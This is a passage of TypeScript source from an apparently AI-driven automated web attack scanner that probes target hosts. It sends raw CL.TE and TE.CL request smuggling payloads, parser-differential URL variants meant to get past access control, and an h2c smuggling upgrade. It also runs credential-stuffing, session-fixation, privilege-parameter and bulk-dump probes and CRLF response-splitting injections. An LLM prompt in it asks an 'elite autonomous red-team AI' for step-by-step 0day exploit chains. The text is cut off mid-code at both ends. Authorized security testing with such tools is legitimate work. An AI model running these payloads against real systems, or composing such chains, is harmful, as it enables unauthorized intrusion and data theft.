                    type: '0day Candidate', endpoint: ep.url, probe: probe.name,
                    gap: `Behavioral anomaly: ${evidence.join('; ')}`, chain_potential: null, evidence
                  });
                  anomalyCount++;
                }
              }
            } catch {}
          }
        }
        this.log(jobId, 'info', `Phase 4d-1 complete: ${anomalyCount} behavioral anomaly(ies) flagged`);

        // 4d-2: Differential Response Analysis — semantically equivalent requests, structural differences
        this.log(jobId, 'info', 'Phase 4d-2: Differential Response Analysis');
        let diffCount = 0;
        for (const ep of zerodayTargets.slice(0, 10)) {
          if (diffCount >= 5) break;
          try {
            const variants = [
              { name: 'Case variation', url: ep.url.replace(/\/([a-z])/g, (_, c: string) => `/${c.toUpperCase()}`) },
              { name: 'Trailing dot', url: ep.url.replace(/(https?:\/\/[^/]+)/, '$1.') },
              { name: 'Double slash', url: ep.url.replace(/(https?:\/\/[^/]+)(\/.*)?$/, '$1/$2') },
              { name: 'Tab in path', url: ep.url.replace(/\/([^/]+)$/, '/\t$1') },
              { name: 'Semicolon path', url: ep.url.replace(/\/([^/]+)$/, '/;$1') },
              { name: 'URL-encoded slash', url: ep.url.replace(/\/([^/]+)$/, '%2f$1') },
            ];

            const baseRes = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true }).catch(() => null);
            if (!baseRes) continue;

            const baseBody = typeof baseRes.data === 'string' ? baseRes.data : JSON.stringify(baseRes.data);

            for (const variant of variants) {
              try {
                const varRes = await axios.get(variant.url, { timeout: 5000, validateStatus: () => true });
                const varBody = typeof varRes.data === 'string' ? varRes.data : JSON.stringify(varRes.data);

                const statusDiff = baseRes.status !== varRes.status;
                const accessEscalation = baseRes.status === 403 && varRes.status === 200;
                const contentDiff = baseBody !== varBody && Math.abs(baseBody.length - varBody.length) > 100;

                if (accessEscalation || (statusDiff && contentDiff)) {
                  this.log(jobId, 'vuln', `DIFFERENTIAL ANOMALY [${variant.name}]: ${ep.url}`, {
                    original: { status: baseRes.status, length: baseBody.length },
                    variant: { status: varRes.status, length: varBody.length, url: variant.url },
                    accessEscalation
                  });

                  if (ai) {
                    const diffPrompt = `Analyze this differential response anomaly for access control bypass or parser differential vulnerability.

Original URL: ${ep.url} → Status ${baseRes.status}, Body size ${baseBody.length}
Variant URL (${variant.name}): ${variant.url} → Status ${varRes.status}, Body size ${varBody.length}
${accessEscalation ? 'ACCESS ESCALATION DETECTED: 403 → 200' : ''}
Original body snippet: ${baseBody.substring(0, 500)}
Variant body snippet: ${varBody.substring(0, 500)}

Is this a real access control bypass or parser differential vulnerability?
Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

                    const analysis = safeJsonParse<AiVulnResult>(await ai.generate(diffPrompt, true), NULL_VULN);
                    if (analysis.isVulnerable && analysis.confidence > 0.7) {
                      MemoryManager.addFinding(jobId, hostname, {
                        type: '0day Candidate', subtype: 'Parser Differential',
                        endpoint: ep.url, variant: variant.url, technique: variant.name,
                        gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
                        accessEscalation
                      });
                      diffCount++;
                    }
                  } else if (accessEscalation) {
                    MemoryManager.addFinding(jobId, hostname, {
                      type: '0day Candidate', subtype: 'Access Control Bypass',
                      endpoint: ep.url, variant: variant.url, technique: variant.name,
                      gap: `403→200 via ${variant.name}`, chain_potential: 'Direct unauthorized access'
                    });
                    diffCount++;
                  }
                }
              } catch {}
            }
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4d-2 complete: ${diffCount} differential anomaly(ies) found`);

        // 4d-3: HTTP Request Smuggling Detection (raw TCP sockets to bypass Node.js re-chunking)
        this.log(jobId, 'info', 'Phase 4d-3: HTTP Request Smuggling Detection');
        let smuggleCount = 0;

        const rawHttpRequest = (host: string, port: number, useTls: boolean, rawPayload: string, timeoutMs: number = 8000): Promise<string> => {
          return new Promise((resolve) => {
            let response = '';
            const onData = (data: Buffer) => { response += data.toString(); };
            const onEnd = () => resolve(response);
            const onError = () => resolve('');
            const onTimeout = () => { socket.destroy(); resolve(response || ''); };

            let socket: net.Socket | tls.TLSSocket;
            if (useTls) {
              socket = tls.connect({ host, port, rejectUnauthorized: false }, () => socket.write(rawPayload));
            } else {
              socket = net.createConnection({ host, port }, () => socket.write(rawPayload));
            }
            socket.setTimeout(timeoutMs);
            socket.on('data', onData);
            socket.on('end', onEnd);
            socket.on('error', onError);
            socket.on('timeout', onTimeout);
          });
        };

        for (const asset of discoveredAssets.slice(0, 5)) {
          if (smuggleCount >= 3) break;
          try {
            const parsed = new URL(asset);
            const host = parsed.hostname;
            const useTls = parsed.protocol === 'https:';
            const port = parsed.port ? parseInt(parsed.port) : (useTls ? 443 : 80);

            // CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
            const cltePayload = `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX`;
            const clteResponse = await rawHttpRequest(host, port, useTls, cltePayload);

            // TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
            const teclPayload = `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`;
            const teclResponse = await rawHttpRequest(host, port, useTls, teclPayload);

            // Extract status codes from raw responses
            const clteStatus = clteResponse.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1] || '';
            const teclStatus = teclResponse.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1] || '';

            // Strong smuggling indicators: look for desync evidence, not just status diffs
            const hasGPOST = /GPOST|unrecognized method|invalid method/i.test(teclResponse);
            const hasTimeout = clteResponse === '' && teclResponse !== '';
            const hasDesync = (clteStatus === '400' && teclStatus !== '400') || (teclStatus === '400' && clteStatus !== '400');
            const strongIndicator = hasGPOST || hasTimeout || (hasDesync && /smuggl|chunk|transfer/i.test(clteResponse + teclResponse));

            if (strongIndicator) {
              const evidence = [];
              if (hasGPOST) evidence.push('GPOST method reflected in response');
              if (hasTimeout) evidence.push('CL.TE timeout (potential desync)');
              if (hasDesync) evidence.push(`Status desync: CL.TE=${clteStatus}, TE.CL=${teclStatus}`);

              this.log(jobId, 'vuln', `HTTP SMUGGLING INDICATOR on ${asset}`, {
                clte: { status: clteStatus, body: clteResponse.substring(0, 300) },
                tecl: { status: teclStatus, body: teclResponse.substring(0, 300) },
                evidence,
              });

              if (ai) {
                const smugglePrompt = `Analyze these HTTP request smuggling test results for ${asset}.

CL.TE raw response: ${clteResponse.substring(0, 500)}
TE.CL raw response: ${teclResponse.substring(0, 500)}
Evidence: ${evidence.join(' | ')}

These were sent as raw TCP payloads (no HTTP library normalization).
Determine if this indicates a real HTTP request smuggling vulnerability.
Consider CL.TE, TE.CL, and TE.TE variants. Look for response desync indicators.
Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

                const analysis = safeJsonParse<AiVulnResult>(await ai.generate(smugglePrompt, true), NULL_VULN);
                if (analysis.isVulnerable && analysis.confidence > 0.6) {
                  MemoryManager.addFinding(jobId, hostname, {
                    type: '0day Candidate', subtype: 'HTTP Request Smuggling',
                    endpoint: asset, gap: analysis.gap_identified,
                    chain_potential: analysis.chain_potential || 'Cache poisoning, request hijacking, auth bypass'
                  });
                  smuggleCount++;
                }
              }
              // No AI fallback: only record if we have the strongest indicator (GPOST reflection)
              else if (hasGPOST) {
                MemoryManager.addFinding(jobId, hostname, {
                  type: '0day Candidate', subtype: 'HTTP Request Smuggling',
                  endpoint: asset, gap: 'GPOST method reflected — request smuggling desync confirmed',
                  chain_potential: 'Cache poisoning, request hijacking, auth bypass'
                });
                smuggleCount++;
              }
            }

            // HTTP/2 downgrade detection
            try {
              const h2Res = await axios.get(asset, {
                timeout: 5000, validateStatus: () => true,
                headers: { 'Connection': 'Upgrade, HTTP2-Settings', 'Upgrade': 'h2c', 'HTTP2-Settings': 'AAMAAABkAAQAAP__' },
              });
              if (h2Res.status === 101 || (h2Res.headers['upgrade'] || '').includes('h2c')) {
                this.log(jobId, 'vuln', `H2C SMUGGLING POSSIBLE on ${asset}`);
                MemoryManager.addFinding(jobId, hostname, {
                  type: '0day Candidate', subtype: 'H2C Smuggling',
                  endpoint: asset, gap: 'Server accepts h2c upgrade — HTTP/2 cleartext smuggling possible',
                  chain_potential: 'Bypass reverse proxy auth, access internal endpoints'
                });
                smuggleCount++;
              }
            } catch {}
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4d-3 complete: ${smuggleCount} smuggling indicator(s) found`);

        // 4d-4: AI-Driven 0day Chain Synthesis — correlate all findings for novel attack chains
        if (ai) {
          this.log(jobId, 'info', 'Phase 4d-4: AI-Driven 0day Chain Synthesis');
          const memory = MemoryManager.getMemory(jobId, hostname);
          const allFindingsSummary = memory.findings.slice(-30).map((f: Record<string, unknown>) => ({
            type: f.type, endpoint: f.endpoint || f.asset, gap: f.gap, chain: f.chain_potential
          }));

          if (allFindingsSummary.length >= 2) {
            const chainPrompt = `You are an elite autonomous red-team AI (argila). Analyze all discovered findings for this target and synthesize novel 0day attack chains.

Target: ${targetUrl}
Tech Stack: ${JSON.stringify(discoveredInfo)}
Total Findings: ${allFindingsSummary.length}

Findings Summary:
${JSON.stringify(allFindingsSummary, null, 2)}

Your task:
1. Identify findings that can be CHAINED together to create a higher-impact exploit (e.g., CORS + SSRF = internal service access; open redirect + JWT weakness = token theft)
2. Look for novel combinations that wouldn't be caught by standard scanners
3. Propose attack chains with step-by-step exploitation paths
4. Rate each chain's severity and feasibility

Return JSON: { "chains": [ { "name": string, "steps": string[], "findings_used": string[], "severity": "CRITICAL"|"HIGH"|"MEDIUM", "feasibility": number, "impact": string, "novelty": string } ] }`;

            const chainResult = safeJsonParse<{ chains: { name: string; steps: string[]; findings_used: string[]; severity: string; feasibility: number; impact: string; novelty: string }[] }>(
              await ai.generate(chainPrompt, true), { chains: [] }
            );

            for (const chain of chainResult.chains.filter(c => c.feasibility > 0.6)) {
              this.log(jobId, 'vuln', `0DAY CHAIN [${chain.severity}]: ${chain.name}`, {
                steps: chain.steps, findings_used: chain.findings_used,
                impact: chain.impact, novelty: chain.novelty, feasibility: chain.feasibility
              });
              MemoryManager.addFinding(jobId, hostname, {
                type: '0day Chain', name: chain.name, steps: chain.steps,
                findings_used: chain.findings_used, severity: chain.severity,
                gap: chain.impact, chain_potential: chain.novelty
              });
            }
            this.log(jobId, 'info', `Phase 4d-4 complete: ${chainResult.chains.filter(c => c.feasibility > 0.6).length} viable chain(s) synthesized`);
          } else {
            this.log(jobId, 'info', 'Phase 4d-4: Insufficient findings for chain synthesis (need 2+)');
          }
        }

        // Collect all Phase 4d findings into allFindings for the final report
        const phase4dMemory = MemoryManager.getMemory(jobId, hostname);
        const phase4dFindings = phase4dMemory.findings.filter((f: Record<string, unknown>) => f.type === '0day Candidate' || f.type === '0day Chain');
        if (phase4dFindings.length > 0) {
          allFindings.push({ phase: 'Phase 4d', type: '0day Discovery Results', data: phase4dFindings });
          vulnerabilities.push(...phase4dFindings.map((f: Record<string, unknown>) => ({
            type: f.type, endpoint: f.endpoint || f.asset, gap: f.gap,
            severity: f.severity || 'HIGH', phase: 'Phase 4d'
          })));
        }
        this.log(jobId, 'info', `Phase 4d complete: ${phase4dFindings.length} 0day finding(s) added to report`);

        // --- PHASE 4e: USER AND ENTITY BEHAVIOR ANALYTICS (UEBA) ---
        this.log(jobId, 'info', 'Phase 4e: User & Entity Behavior Analytics (UEBA)');
        this.updateJob(jobId, 'running', 'Phase 4e: UEBA');

        // 4e-1: Build behavioral baselines from observed traffic patterns
        this.log(jobId, 'info', 'Phase 4e-1: Building behavioral baselines');
        const uebaEndpoints = prioritizedEndpoints.slice(0, 20);
        const behaviorBaselines = new Map<string, {
          avgLatency: number; avgSize: number; statusCode: number;
          headerFingerprint: string; cookieNames: string[];
          contentType: string; serverHeader: string;
        }>();

        for (const ep of uebaEndpoints) {
          try {
            const samples: { latency: number; size: number; status: number }[] = [];
            let headerFp = '';
            let cookies: string[] = [];
            let contentType = '';
            let serverHeader = '';

            // Take 3 baseline samples per endpoint for statistical reliability
            for (let i = 0; i < 3; i++) {
              const start = Date.now();
              const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
              samples.push({ latency: Date.now() - start, size: bodyStr.length, status: res.status });

              if (i === 0) {
                headerFp = Object.keys(res.headers).sort().join(',');
                cookies = (res.headers['set-cookie'] || []).map((c: string) => c.split('=')[0]);
                contentType = String(res.headers['content-type'] || '').split(';')[0];
                serverHeader = String(res.headers['server'] || '');
              }
              if (i < 2) await delay(200);
            }

            const avgLatency = samples.reduce((s, x) => s + x.latency, 0) / samples.length;
            const avgSize = samples.reduce((s, x) => s + x.size, 0) / samples.length;

            behaviorBaselines.set(ep.url, {
              avgLatency, avgSize, statusCode: samples[0].status,
              headerFingerprint: headerFp, cookieNames: cookies,
              contentType, serverHeader,
            });
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4e-1 complete: ${behaviorBaselines.size} endpoint baselines established`);

        // 4e-2: Detect low-and-slow behavioral anomalies
        this.log(jobId, 'info', 'Phase 4e-2: Low-and-slow attack pattern detection');
        let uebaCount = 0;
        const lowSlowProbes: { name: string; method: string; transform: (url: string) => { url: string; headers?: Record<string, string>; data?: string } }[] = [
          {
            name: 'Credential stuffing pattern',
            method: 'POST',
            transform: (url) => ({
              url, headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              data: 'username=admin&password=test123'
            }),
          },
          {
            name: 'Session fixation probe',
            method: 'GET',
            transform: (url) => ({
              url, headers: { 'Cookie': 'session=fixated_session_id_12345; JSESSIONID=attacker_controlled' },
            }),
          },
          {
            name: 'Privilege escalation via role param',
            method: 'GET',
            transform: (url) => {
              const sep = url.includes('?') ? '&' : '?';
              return { url: `${url}${sep}role=admin&is_admin=1&privilege=superuser&access_level=9` };
            },
          },
          {
            name: 'Enumeration cadence detection',
            method: 'GET',
            transform: (url) => {
              const sep = url.includes('?') ? '&' : '?';
              return { url: `${url}${sep}id=1` };
            },
          },
          {
            name: 'API abuse — rate boundary',
            method: 'GET',
            transform: (url) => {
              const sep = url.includes('?') ? '&' : '?';
              return { url: `${url}${sep}limit=999999&offset=0&page=1` };
            },
          },
          {
            name: 'Insider data exfil — bulk export',
            method: 'GET',
            transform: (url) => {
              const sep = url.includes('?') ? '&' : '?';
              return { url: `${url}${sep}export=csv&format=json&download=all&dump=true` };
            },
          },
        ];

        for (const ep of uebaEndpoints.slice(0, 12)) {
          if (uebaCount >= 8) break;
          const baseline = behaviorBaselines.get(ep.url);
          if (!baseline) continue;

          for (const probe of lowSlowProbes) {
            try {
              const config = probe.transform(ep.url);
              const start = Date.now();
              const res = probe.method === 'POST'
                ? await axios.post(config.url, config.data || '', {
                    timeout: 8000, validateStatus: () => true,
                    headers: config.headers || {},
                  })
                : await axios.get(config.url, {
                    timeout: 8000, validateStatus: () => true,
                    headers: config.headers || {},
                  });

              const latency = Date.now() - start;
              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
              const bodyLen = bodyStr.length;
              const responseHeaders = Object.keys(res.headers).sort().join(',');

              // Behavioral deviation analysis
              const deviations: string[] = [];

              // Status code change indicating access control reaction
              if (res.status !== baseline.statusCode) {
                if (res.status === 200 && baseline.statusCode >= 400) {
                  deviations.push(`Access granted: ${baseline.statusCode} → ${res.status} (potential bypass)`);
                } else if (res.status === 302 || res.status === 301) {
                  const location = res.headers['location'] || '';
                  if (/login|auth|signin|sso/i.test(location)) {
                    deviations.push(`Auth redirect detected: → ${location}`);
                  }
                }
              }

              // Response size anomaly — data exposure
              if (bodyLen > baseline.avgSize * 3 && bodyLen > 1000) {
                deviations.push(`Data volume spike: ${Math.round(baseline.avgSize)} → ${bodyLen} bytes (potential data leak)`);
              }

              // Header fingerprint change — different backend/handler
              if (responseHeaders !== baseline.headerFingerprint) {
                deviations.push(`Header fingerprint changed: different backend handling`);
              }

              // Latency anomaly — heavy processing
              if (latency > baseline.avgLatency * 5 && latency > 3000) {
                deviations.push(`Processing spike: ${Math.round(baseline.avgLatency)}ms → ${latency}ms`);
              }

              // Content type shift — different response handler
              const resContentType = String(res.headers['content-type'] || '').split(';')[0];
              if (resContentType && resContentType !== baseline.contentType) {
                deviations.push(`Content-Type shift: ${baseline.contentType} → ${resContentType}`);
              }

              // Check for sensitive data in response
              const sensitivePatterns = /password|secret|api[_-]?key|access[_-]?token|private[_-]?key|ssn|credit[_-]?card|\b\d{3}-\d{2}-\d{4}\b|bearer\s+[a-zA-Z0-9._-]{20,}/i;
              if (sensitivePatterns.test(bodyStr)) {
                deviations.push(`Sensitive data detected in response body`);
              }

              if (deviations.length >= 2 || (deviations.length === 1 && deviations[0].includes('bypass'))) {
                this.log(jobId, 'vuln', `UEBA ANOMALY [${probe.name}]: ${ep.url}`, { deviations });

                if (ai) {
                  const uebaPrompt = `As an advanced threat analyst, analyze this User and Entity Behavior Analytics (UEBA) anomaly.

Endpoint: ${ep.url}
Probe: ${probe.name}
Behavioral Deviations:
${deviations.map(d => `- ${d}`).join('\n')}

Baseline: Status ${baseline.statusCode}, Avg Size ${Math.round(baseline.avgSize)}b, Avg Latency ${Math.round(baseline.avgLatency)}ms
Probe Response: Status ${res.status}, Size ${bodyLen}b, Latency ${latency}ms
Response Snippet: ${bodyStr.substring(0, 1500)}
Server: ${baseline.serverHeader}

Determine if these behavioral deviations indicate:
1. Low-and-slow attack success (credential stuffing, session hijack, privilege escalation)
2. Insider threat indicator (unusual data access, bulk extraction)
3. Access control weakness exploitable through behavioral manipulation

Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null, "threat_type": "low_and_slow" | "insider_threat" | "access_control" | "data_exfil" }`;

                  const analysis = safeJsonParse<AiVulnResult & { threat_type?: string }>(
                    await ai.generate(uebaPrompt, true), { ...NULL_VULN, threat_type: 'unknown' }
                  );

                  if (analysis.isVulnerable && analysis.confidence > 0.7) {
                    this.log(jobId, 'vuln', `UEBA THREAT [${analysis.threat_type}]: ${analysis.gap_identified}`, {
                      endpoint: ep.url, probe: probe.name, deviations,
                      threat_type: analysis.threat_type, explanation: analysis.explanation,
                    });
                    MemoryManager.addFinding(jobId, hostname, {
                      type: 'UEBA Anomaly', subtype: analysis.threat_type,
                      endpoint: ep.url, probe: probe.name, deviations,
                      gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
                      severity: 'HIGH',
                    });
                    uebaCount++;
                  }
                } else {
                  // Without AI, only flag the strongest signals
                  if (deviations.some(d => d.includes('bypass') || d.includes('Sensitive data'))) {
                    MemoryManager.addFinding(jobId, hostname, {
                      type: 'UEBA Anomaly', subtype: 'behavioral_deviation',
                      endpoint: ep.url, probe: probe.name, deviations,
                      gap: deviations.join('; '), chain_potential: null, severity: 'MEDIUM',
                    });
                    uebaCount++;
                  }
                }
              }
            } catch {}
          }
        }

        // 4e-3: Session behavior analysis — detect session mismanagement
        this.log(jobId, 'info', 'Phase 4e-3: Session behavior analysis');
        for (const ep of uebaEndpoints.slice(0, 5)) {
          if (uebaCount >= 8) break;
          try {
            // Check if session tokens rotate properly
            const res1 = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
            const cookies1 = res1.headers['set-cookie'] || [];
            await delay(500);
            const res2 = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
            const cookies2 = res2.headers['set-cookie'] || [];

            const sessionIssues: string[] = [];

            // Check for predictable session IDs
            for (const c of cookies1) {
              const val = c.split('=')[1]?.split(';')[0] || '';
              if (/^[0-9]+$/.test(val) && val.length < 10) {
                sessionIssues.push(`Predictable numeric session ID: ${c.split('=')[0]}=${val}`);
              }
              if (/^(session|sid|sess)$/i.test(c.split('=')[0]) && val.length < 16) {
                sessionIssues.push(`Short session token (${val.length} chars): weak entropy`);
              }
            }

            // Check for session tokens that don't change between requests (non-rotation)
            const c1Vals = cookies1.map((c: string) => c.split(';')[0]).sort();
            const c2Vals = cookies2.map((c: string) => c.split(';')[0]).sort();
            if (c1Vals.length > 0 && JSON.stringify(c1Vals) === JSON.stringify(c2Vals)) {
              // This is actually normal for session cookies — only flag if combined with other issues
            }

            if (sessionIssues.length > 0) {
              this.log(jobId, 'vuln', `SESSION BEHAVIOR ANOMALY: ${ep.url}`, { issues: sessionIssues });
              MemoryManager.addFinding(jobId, hostname, {
                type: 'UEBA Anomaly', subtype: 'session_mismanagement',
                endpoint: ep.url, gap: sessionIssues.join('; '),
                chain_potential: 'Session hijacking, fixation, or prediction', severity: 'HIGH',
              });
              uebaCount++;
            }
          } catch {}
        }

        // Collect Phase 4e findings
        const phase4eMemory = MemoryManager.getMemory(jobId, hostname);
        const phase4eFindings = phase4eMemory.findings.filter((f: Record<string, unknown>) => f.type === 'UEBA Anomaly');
        const newPhase4eFindings = phase4eFindings.slice(phase4eFindings.length - uebaCount);
        if (newPhase4eFindings.length > 0) {
          allFindings.push({ phase: 'Phase 4e', type: 'UEBA Analysis Results', data: newPhase4eFindings });
          vulnerabilities.push(...newPhase4eFindings.map((f: Record<string, unknown>) => ({
            type: f.type, endpoint: f.endpoint, gap: f.gap,
            severity: f.severity || 'HIGH', phase: 'Phase 4e'
          })));
        }
        this.log(jobId, 'info', `Phase 4e complete: ${uebaCount} UEBA anomaly(ies) detected`);

        // --- PHASE 4f: NETWORK & HOST TRAFFIC ANOMALY DETECTION ---
        this.log(jobId, 'info', 'Phase 4f: Network & Host Traffic Anomaly Detection');
        this.updateJob(jobId, 'running', 'Phase 4f: Traffic Anomaly Detection');

        // 4f-1: Protocol-level anomaly detection — deep inspection of HTTP semantics
        this.log(jobId, 'info', 'Phase 4f-1: Protocol-level anomaly detection');
        let trafficCount = 0;
        const trafficTargets = prioritizedEndpoints.slice(0, 15);

        for (const ep of trafficTargets) {
          if (trafficCount >= 10) break;
          try {
            const parsed = new URL(ep.url);
            const host = parsed.hostname;
            const useTls = parsed.protocol === 'https:';
            const port = parsed.port ? parseInt(parsed.port) : (useTls ? 443 : 80);
            const path = parsed.pathname + parsed.search;

            // Test 1: HTTP method confusion — send unusual methods
            const unusualMethods = ['TRACE', 'CONNECT', 'OPTIONS', 'PROPFIND', 'PATCH'];
            for (const method of unusualMethods) {
              try {
                const res = await axios.request({
                  url: ep.url, method: method as any,
                  timeout: 5000, validateStatus: () => true,
                });

                if (method === 'TRACE' && res.status === 200) {
                  const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
                  if (/TRACE|message\/http/i.test(bodyStr + (res.headers['content-type'] || ''))) {
                    this.log(jobId, 'vuln', `TRACE METHOD ENABLED on ${ep.url}`);
                    MemoryManager.addFinding(jobId, hostname, {
                      type: 'Traffic Anomaly', subtype: 'TRACE enabled',
                      endpoint: ep.url, gap: 'TRACE method enabled — Cross-Site Tracing (XST) possible',
                      chain_potential: 'Steal HttpOnly cookies via XST', severity: 'MEDIUM',
                    });
                    trafficCount++;
                  }
                }

                if (method === 'OPTIONS' && res.status === 200) {
                  const allow = res.headers['allow'] || res.headers['access-control-allow-methods'] || '';
                  if (/PUT|DELETE|PATCH/i.test(allow)) {
                    const dangerousMethods = allow.split(',').map((m: string) => m.trim()).filter((m: string) => /PUT|DELETE|PATCH/i.test(m));
                    this.log(jobId, 'vuln', `DANGEROUS METHODS ALLOWED on ${ep.url}: ${dangerousMethods.join(', ')}`);
                    MemoryManager.addFinding(jobId, hostname, {
                      type: 'Traffic Anomaly', subtype: 'Dangerous methods',
                      endpoint: ep.url, methods: dangerousMethods,
                      gap: `Dangerous HTTP methods allowed: ${dangerousMethods.join(', ')}`,
                      chain_potential: 'Unauthorized data modification or deletion', severity: 'MEDIUM',
                    });
                    trafficCount++;
                  }
                }

                if (method === 'PROPFIND' && (res.status === 207 || res.status === 200)) {
                  this.log(jobId, 'vuln', `WebDAV PROPFIND active on ${ep.url}`);
                  MemoryManager.addFinding(jobId, hostname, {
                    type: 'Traffic Anomaly', subtype: 'WebDAV active',
                    endpoint: ep.url, gap: 'WebDAV PROPFIND enabled — directory listing and file manipulation possible',
                    chain_potential: 'Upload webshell via PUT, list sensitive files', severity: 'HIGH',
                  });
                  trafficCount++;
                }
              } catch {}
            }

            // Test 2: TLS/SSL inspection — check for downgrade and weak ciphers
            if (useTls) {
              try {
                const tlsInfo = await new Promise<{
                  protocol: string; cipher: string; authorized: boolean;
                  certExpiry: string; certSubject: string;
                }>((resolve, reject) => {
                  const socket = tls.connect({ host, port, rejectUnauthorized: false }, () => {
                    const cipher = socket.getCipher();
                    const cert = socket.getPeerCertificate();
                    resolve({
                      protocol: socket.getProtocol() || 'unknown',
                      cipher: cipher ? `${cipher.name} (${cipher.version})` : 'unknown',
                      authorized: socket.authorized,
                      certExpiry: cert.valid_to || '',
                      certSubject: cert.subject ? JSON.stringify(cert.subject) : '',
                    });
                    socket.end();
                  });
                  socket.setTimeout(5000);
                  socket.on('error', reject);
                  socket.on('timeout', () => { socket.destroy(); reject(new Error('timeout')); });
                });

                const tlsIssues: string[] = [];

                // Weak protocol versions
                if (/TLSv1$|TLSv1\.0|SSLv3/i.test(tlsInfo.protocol)) {
                  tlsIssues.push(`Weak TLS version: ${tlsInfo.protocol}`);
                }

                // Weak ciphers
                if (/RC4|DES|MD5|NULL|EXPORT|anon/i.test(tlsInfo.cipher)) {
                  tlsIssues.push(`Weak cipher: ${tlsInfo.cipher}`);
                }

                // Certificate expiry check
                if (tlsInfo.certExpiry) {
                  const expiry = new Date(tlsInfo.certExpiry);
                  const now = new Date();
                  const daysToExpiry = (expiry.getTime() - now.getTime()) / (1000 * 60 * 60 * 24);
                  if (daysToExpiry < 0) {
                    tlsIssues.push(`Certificate expired: ${tlsInfo.certExpiry}`);
                  } else if (daysToExpiry < 30) {
                    tlsIssues.push(`Certificate expiring soon (${Math.round(daysToExpiry)} days): ${tlsInfo.certExpiry}`);
                  }
                }

                // Self-signed or unauthorized
                if (!tlsInfo.authorized) {
                  tlsIssues.push('Certificate not trusted (self-signed or invalid chain)');
                }

                if (tlsIssues.length > 0) {
                  this.log(jobId, 'vuln', `TLS ANOMALY on ${host}:${port}`, {
                    issues: tlsIssues, protocol: tlsInfo.protocol, cipher: tlsInfo.cipher,
                  });
                  MemoryManager.addFinding(jobId, hostname, {
                    type: 'Traffic Anomaly', subtype: 'TLS weakness',
                    endpoint: ep.url, gap: tlsIssues.join('; '),
                    chain_potential: 'MITM attack, traffic interception, downgrade attacks',
                    severity: tlsIssues.some(i => i.includes('expired') || i.includes('Weak TLS')) ? 'HIGH' : 'MEDIUM',
                    details: { protocol: tlsInfo.protocol, cipher: tlsInfo.cipher },
                  });
                  trafficCount++;
                }
              } catch {}
            }

            // Test 3: HTTP/2 and protocol-level fingerprinting
            try {
              const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
              const serverHeader = res.headers['server'] || '';
              const poweredBy = res.headers['x-powered-by'] || '';
              const via = res.headers['via'] || '';
              const xForwarded = res.headers['x-forwarded-for'] || res.headers['x-real-ip'] || '';

              const fingerprints: string[] = [];
              if (serverHeader) fingerprints.push(`Server: ${serverHeader}`);
              if (poweredBy) fingerprints.push(`X-Powered-By: ${poweredBy}`);
              if (via) fingerprints.push(`Via: ${via} (proxy/CDN detected)`);
              if (xForwarded) fingerprints.push(`X-Forwarded-For leaked: ${xForwarded}`);

              // Check for information disclosure via headers
              if (poweredBy || (serverHeader && /\d+\.\d+/.test(String(serverHeader)))) {
                this.log(jobId, 'info', `Server fingerprint: ${fingerprints.join(', ')}`, { endpoint: ep.url });
              }
            } catch {}
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4f-1 complete: ${trafficCount} protocol anomaly(ies) detected`);

        // 4f-2: Connection behavior analysis — detect infrastructure-level patterns
        this.log(jobId, 'info', 'Phase 4f-2: Connection behavior analysis');
        const connTargets = discoveredAssets.slice(0, 8);
        for (const asset of connTargets) {
          if (trafficCount >= 10) break;
          try {
            const parsed = new URL(asset);
            const host = parsed.hostname;
            const useTls = parsed.protocol === 'https:';
            const port = parsed.port ? parseInt(parsed.port) : (useTls ? 443 : 80);

            // Test connection reuse behavior — detect keep-alive misconfigurations
            const rawProbe = `GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: keep-alive\r\n\r\nGET /nonexistent-probe-path HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`;

            const pipelineResponse = await rawHttpRequest(host, port, useTls, rawProbe, 5000);

            // Check if server processed both requests (HTTP pipelining)
            const httpResponses = pipelineResponse.split(/(?=HTTP\/\d)/);
            if (httpResponses.length > 2) {
              this.log(jobId, 'vuln', `HTTP PIPELINING ACCEPTED on ${asset}`);
              MemoryManager.addFinding(jobId, hostname, {
                type: 'Traffic Anomaly', subtype: 'HTTP pipelining',
                endpoint: asset, gap: 'Server processes pipelined requests — potential for request smuggling and response queue poisoning',
                chain_potential: 'Response queue poisoning, cache deception', severity: 'MEDIUM',
              });
              trafficCount++;
            }

            // Test for HTTP response splitting via header injection
            try {
              const splitUrl = `${asset}${asset.includes('?') ? '&' : '?'}redirect=%0d%0aX-Injected:%20true`;
              const splitRes = await axios.get(splitUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });
              if (splitRes.headers['x-injected'] === 'true') {
                this.log(jobId, 'vuln', `HTTP RESPONSE SPLITTING on ${asset}`);
                MemoryManager.addFinding(jobId, hostname, {
